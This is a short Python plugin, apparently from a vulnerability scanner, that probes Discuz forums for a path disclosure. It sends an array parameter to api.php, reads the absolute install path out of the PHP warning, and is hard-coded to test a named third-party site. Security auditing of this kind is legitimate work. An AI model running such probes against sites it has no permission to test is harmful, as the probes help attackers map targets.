#!/usr/bin/env python   
import re  
  
def assign(service, arg):  
    if service != "discuz":  
        return  
    return True, arg  
  
def audit(arg):  
    url = arg  
    code, head, res, errcode, _ = curl.curl(url + 'api.php?mod[]=Seay')  
    if code == 200:  
        m = re.search('<b>Warning</b>:[^\r\n]+or an integer in <b>([^<]+)api\.php</b> on line <b>(\d+)</b>', res)
        if m:  
            security_info(m.group(1))  
  
  
if __name__ == '__main__':  
    from dummy import *  
    audit(assign('discuz', 'http://www.feifeiz.com/')[1])  
